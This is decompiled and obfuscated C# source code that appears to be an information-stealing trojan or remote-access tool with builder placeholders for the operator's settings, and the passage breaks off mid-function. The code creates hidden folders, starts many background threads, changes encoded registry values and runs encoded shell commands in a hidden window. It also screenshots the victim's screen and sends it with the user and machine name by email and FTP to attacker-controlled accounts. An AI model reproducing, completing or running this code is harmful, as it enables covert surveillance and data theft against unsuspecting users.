using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ns0;
using ns1;
using ns2;
using ns4;
using ns5;
using ns6;
using ns7;
using ns8;

namespace ns3;

internal class Class5
{
	public static string string_0 = "";

	public static string string_1 = Class6.smethod_0("lJ2zs7NRc4e1rJCeqLq0k52rt66IaqrDboSfJw==", "False");

	public static string string_2 = Class6.smethod_0("jJ+2sq6Isby1plVueoIn", "False");

	public static string string_3 = Class6.smethod_0("USERFTPSITE", "False");

	public static string string_4 = Class6.smethod_0("ls/M4M6iycwI", "False");

	public static string string_5 = Class6.smethod_0("sb3a4dewzssI", "False");

	public static string string_6 = Class6.smethod_0("d7C+tSc=", "False");

	public static string string_7 = Class6.smethod_0("ZZuxv6Mn", "False");

	public static string string_8 = Class6.smethod_0("lqu9wHCKq6q5rlGhuL0n", "False");

	public static int int_0 = 587;

	public static string string_9 = "";

	public static string string_10 = "";

	public static string string_11 = "";

	public static string string_12 = Class6.smethod_0("ls/d1Ag=", "False");

	public static string string_13 = Class6.smethod_0("ls/d1Ag=", "False");

	public static string string_14 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_15 = Class6.smethod_0("ls/d1Ag=", "False");

	public static string string_16 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_17 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_18 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_19 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_20 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_21 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_22 = Class6.smethod_0("hLrQ3sII", "False");

	public static string string_23 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_24 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_25 = Class6.smethod_0("USERNMBZZ", "False");

	public static string string_26 = Class6.smethod_0("USERPGDN", "False");

	public static string string_27 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_28 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_29 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_30 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_31 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_32 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_33 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_34 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_35 = Class6.smethod_0("baa0qzE=", "False");

	public static string string_36 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_37 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_38 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_39 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_40 = Class6.smethod_0("baa0qzE=", "False");

	public static string string_41 = Class6.smethod_0("W5GntZkx", "False");

	public static int int_1 = 0;

	public static string string_42 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_43 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_44 = Class6.smethod_0("W5GntZkx", "False");

	public static string string_45 = Class6.smethod_0("n8bR1JBmgRE=", "False");

	public static string string_46 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_47 = Class6.smethod_0("n8bR1JBmgRE=", "False");

	public static string string_48 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_49 = Class6.smethod_0("EQ==", "False");

	public static string string_50 = Class6.smethod_0("e8PO0sdwcYzbhWaBlZuGZhE=", "False");

	public static string string_51 = Class6.smethod_0("j7zMycavxn64vKrJx8i8q3PB1Mykt37TxqxzytS4nHOruJprhYypo4SBfhE=", "False");

	public static string string_52 = Class6.smethod_0("jcbUyxE=", "False");

	public static string string_53 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_54 = Class6.smethod_0("jcbUyxE=", "False");

	public static string string_55 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_56 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_57 = Class6.smethod_0("W5GntZkxSP", "False");

	public static string string_58 = Class6.smethod_0("USERPP2SP", "False");

	public static string string_59 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_60 = Class6.smethod_0("e7HH1bkR", "False");

	public static string string_61 = Class6.smethod_0("h73T4cUF", "False");

	public static int int_2 = 1800000;

	public static string string_62 = "";

	public static string string_63 = "";

	public static int int_3 = 0;

	public static Class17 class17_0;

	public static Thread thread_0 = new Thread(smethod_2);

	public static Thread thread_1 = new Thread(Class13.smethod_0);

	public static Thread thread_2 = new Thread(smethod_4);

	public static Thread thread_3 = new Thread(smethod_5);

	public static Thread thread_4 = new Thread(smethod_1);

	public static Thread thread_5 = new Thread(Class39.Class40.smethod_2);

	public static Thread thread_6 = new Thread(Class15.Class16.smethod_0);

	public static Thread thread_7 = new Thread(smethod_6);

	public static Thread thread_8 = new Thread(smethod_7);

	public static Thread thread_9 = new Thread(Class31.Class32.smethod_0);

	public static Thread thread_10 = new Thread(smethod_8);

	public static Thread thread_11 = new Thread(Class9.Class10.smethod_0);

	public static Thread thread_12 = new Thread(Class19.Class20.smethod_0);

	public static Thread thread_13 = new Thread(smethod_9);

	public static Thread thread_14 = new Thread(Class11.Class12.smethod_0);

	public static Thread thread_15 = new Thread(Class35.Class36.smethod_0);

	[STAThread]
	public static void Main()
	{
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0417: Unknown result type (might be due to invalid IL or missing references)
		IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		int num = default(int);
		if (Operators.CompareString(string_41, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
		{
			try
			{
				Thread.Sleep(int_1);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex, num);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				class17_0 = new Class17(string_63);
				Class17.smethod_1();
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			thread_0.IsBackground = true;
			thread_0.Start();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_48, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				string text = string_49;
				if (Operators.CompareString(text, Class6.smethod_0("ltLc2gI=", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)0);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("h6zIy7ieshg=", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)48);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("c8G3x66bqsjEvJwZ", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)48);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("bqqwuC8=", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("W6Ousqcw", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("kdDL4NOpytQJ", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)32);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("cKS8uSI=", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("h9Tg2Nev1NcD", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				else if (Operators.CompareString(text, Class6.smethod_0("b6+ywreTosC8tJQh", "False"), false) == 0)
				{
					MessageBox.Show(string_51, string_50, (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				else
				{
					MessageBox.Show(Class6.smethod_0("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), Class6.smethod_0("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_42, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Class21.Class22.smethod_0();
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_44, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Process.Start(string_45);
			}
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_46, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_3.IsBackground = true;
				thread_3.Start();
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_43, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_4.IsBackground = true;
				thread_4.Start();
			}
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_52, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_5.IsBackground = true;
				thread_5.Start();
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_12, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_1.IsBackground = true;
				thread_1.Start();
			}
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_13, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Class33.Class34 @class = new Class33.Class34();
				@class.method_0();
			}
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_14, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Class18.smethod_2();
			}
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_15, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Class29.Class30 class2 = new Class29.Class30();
				class2.method_0();
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_16, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), overwrite: true);
			}
		}
		catch (Exception ex16)
		{
			ProjectData.SetProjectError(ex16, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_17, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), overwrite: true);
			}
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_18, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), overwrite: true);
			}
		}
		catch (Exception ex18)
		{
			ProjectData.SetProjectError(ex18, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_19, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), overwrite: true);
			}
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_20, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("g4S2yKmWq7uwvYiuubm6VaauyCM=", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("l6PKy8yqydDOzpeYwsvFsMbUxNGcws3Nzmm6wtwP", "False"), overwrite: true);
			}
		}
		catch (Exception ex20)
		{
			ProjectData.SetProjectError(ex20, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_21, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("k6XN08qguNbAyZzG0c3EnsUR", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("gY20tbaUs7q4uIGCrLWvmrC+rreKtL+7soyzIw==", "False"), overwrite: true);
			}
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_24, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), overwrite: true);
			}
		}
		catch (Exception ex22)
		{
			ProjectData.SetProjectError(ex22, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_22, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_6.IsBackground = true;
				thread_6.Start();
			}
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_23, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_7.IsBackground = true;
				thread_7.Start();
			}
		}
		catch (Exception ex24)
		{
			ProjectData.SetProjectError(ex24, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_25, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_8.IsBackground = true;
				thread_8.Start();
			}
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_26, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_9.IsBackground = true;
				thread_9.Start();
			}
		}
		catch (Exception ex26)
		{
			ProjectData.SetProjectError(ex26, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_27, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_10.IsBackground = true;
				thread_10.Start();
			}
		}
		catch (Exception ex27)
		{
			ProjectData.SetProjectError(ex27, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_28, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Class23.Class24.smethod_2();
			}
		}
		catch (Exception ex28)
		{
			ProjectData.SetProjectError(ex28, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_29, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_11.IsBackground = true;
				thread_11.Start();
			}
		}
		catch (Exception ex29)
		{
			ProjectData.SetProjectError(ex29, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_30, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_12.IsBackground = true;
				thread_12.Start();
			}
		}
		catch (Exception ex30)
		{
			ProjectData.SetProjectError(ex30, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_31, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_13.IsBackground = true;
				thread_13.Start();
			}
		}
		catch (Exception ex31)
		{
			ProjectData.SetProjectError(ex31, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_32, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("cY+Ur6dsmaGojXeYrqubbparqbePuMa3uo6gnL+rm7PCxa6doKa/to2zxsmkbLnByK2XuKW7upytvsSkebO7v6uSqcKym6K3w7u1HQ==", "False"), Class6.smethod_0("hcXaz8KtwbvP06ypzuAJ", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_33, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("ZoSJpJxhjpadgmyNo6CQY4ugnqyErbusr4OVlLqph5ytsLB6hq2ur42ss7GxepCtuaGNsLenkJesuLCqKA==", "False"), Class6.smethod_0("c7PIvbCbr5ipkhc=", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_34, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("h6Wqxb2Cr7e+o42uxMGxhKzBv82lztzN0KS2stXBscnY28SztrzVzKPJ3N+6gs/X3sOtzrvR0LLD1Nq6j8nR1cGov9jIsbjN2dHLBw==", "False"), Class6.smethod_0("a6vAtaiTp5+5rZC1wca/e7G8wLkf", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_35, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_36, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("cH6La56CnWSTiGGOoJ6shK27rK+DlZG0oJCot7qjkpWbtKuCqLu+mWGutr2ijK2asK+RorO5mW6osLSgh563p4KWqbC6r4OrZHqzPoezkayKnam9jI6trbqrkVlzv11wfouqgXWIlo9dTZ1kfF1Nnyo=", "False"), (AppWinStyle)2, false, -1);
			}
			if (Operators.CompareString(string_37, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("a3mGZpl9mF+Og1yJm5mnf6i2p6p+kIyvm4ujsrWejZCWr6Z9o7a5lFypsbidh6iVq6qMna60lGmjq6+bgpmyon2RpKu1qn6mX3WuOYKuiaeHqLG1pGmVraukOWOzZopee56Kj2iGg2ZnfVRwZmd/Lg==", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_38, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("h6Wqxb2Lqaitqp6npq+miKiqyLGOoLnDn5GfwbnHoszU382lzsHDx62+1OPRX6i5yKG0zNfRzLOwyt7RqMnTyLG4zdnRy5G/2ODNsb8J", "False"), Class6.smethod_0("jc3i18q1ycLIAQ==", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
		}
		catch (Exception ex32)
		{
			ProjectData.SetProjectError(ex32, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_39, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_14.IsBackground = true;
				thread_14.Start();
			}
		}
		catch (Exception ex33)
		{
			ProjectData.SetProjectError(ex33, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_60, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				thread_15.IsBackground = true;
				thread_15.Start();
			}
		}
		catch (Exception ex34)
		{
			ProjectData.SetProjectError(ex34, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}
		catch (Exception ex35)
		{
			ProjectData.SetProjectError(ex35, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_53, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				double double_ = 45.0;
				smethod_0(ref double_);
				Application.Exit();
			}
		}
		catch (Exception ex36)
		{
			ProjectData.SetProjectError(ex36, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void smethod_0(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("i57H0bMX", "False")))
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				if (Operators.CompareString(string_6, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
				{
					MailMessage mailMessage = new MailMessage();
					SmtpClient smtpClient = new SmtpClient(string_8);
					mailMessage.From = new MailAddress(string_1);
					mailMessage.To.Add(string_1);
					mailMessage.Subject = Class6.smethod_0("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString();
					mailMessage.Body = Class6.smethod_0("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + Class6.smethod_0("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False");
					smtpClient.Port = int_0;
					smtpClient.EnableSsl = true;
					smtpClient.Credentials = new NetworkCredential(string_1, string_2);
					try
					{
						Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
						mailMessage.Attachments.Add(item);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					smtpClient.Send(mailMessage);
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("i57H0bMX", "False"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(string_7, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
				{
					try
					{
						File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("gIyztLWTsrm3t4CCub+pjbG3sreNrrh/t5yzJA==", "False"), Class6.smethod_0("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + Class6.smethod_0("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False"));
						string text = ((!string_3.Contains(Class6.smethod_0("QqG6vXlPamgp", "False"))) ? (Class6.smethod_0("QqG6vXlPamgp", "False") + string_3) : string_3);
						string userName = string_4;
						string password = string_5;
						string text2 = ((ServerComputer)Class2.smethod_0()).get_Name().ToString();
						try
						{
							FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text + Class6.smethod_0("cwM=", "False") + text2);
							ftpWebRequest.Method = "MKD";
							ftpWebRequest.Credentials = new NetworkCredential(userName, password);
							ftpWebRequest.GetResponse();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						try
						{
							FtpWebRequest ftpWebRequest2 = (FtpWebRequest)WebRequest.Create(text + Class6.smethod_0("cwM=", "False") + text2 + Class6.smethod_0("cwM=", "False") + Class6.smethod_0("erLBxMGarsfObXq4u5VtGA==", "False") + DateTime.Now.ToString() + Class6.smethod_0("Ta69wCs=", "False"));
							ftpWebRequest2.Credentials = new NetworkCredential(userName, password);
							ftpWebRequest2.Method = "STOR";
							byte[] array = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("gIyztLWTsrm3t4CCub+pjbG3sreNrrh/t5yzJA==", "False"));
